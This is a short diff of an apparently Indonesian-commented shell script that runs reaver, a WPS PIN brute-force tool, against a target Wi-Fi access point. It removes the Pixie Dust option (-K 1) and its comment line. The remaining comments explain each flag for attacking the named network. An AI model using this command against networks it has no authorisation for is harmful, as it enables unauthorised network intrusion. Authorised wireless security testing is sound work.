@@ -190,7 +190,7 @@ function mengatur_target(){
 function menjalankan_serangan(){
         waktu=$(date "+%d-%m-%Y_%H:%M:%S")
         sesi="${nama_folder}/${essid}_${waktu}.session"
-	reaver -i "${interface}" -c "${channel}" -b "${bssid}" -e "${essid}" -s "${sesi}" -K 1 -vvv
+	reaver -i "${interface}" -c "${channel}" -b "${bssid}" -e "${essid}" -s "${sesi}" -vvv
         #
         # Keterangan:
 	#
@@ -199,7 +199,6 @@ function menjalankan_serangan(){
 	# -b   : Menentukan bssid (alamat MAC) dari router atau access point yang akan diserang.
         # -e   : Menentukan ESSID (nama jaringan Wi-Fi) dari jaringan yang akan diserang.
 	# -s   : Menentukan file sesi yang digunakan untuk menyimpan atau melanjutkan serangan.
-        # -K   : Mengaktifkan mode serangan Pixie Dust (Pixie Dust attack). 
 	# -vvv : Menambahkan tingkat verbositas (verbosity) untuk output yang lebih detail selama serangan.
 }
 
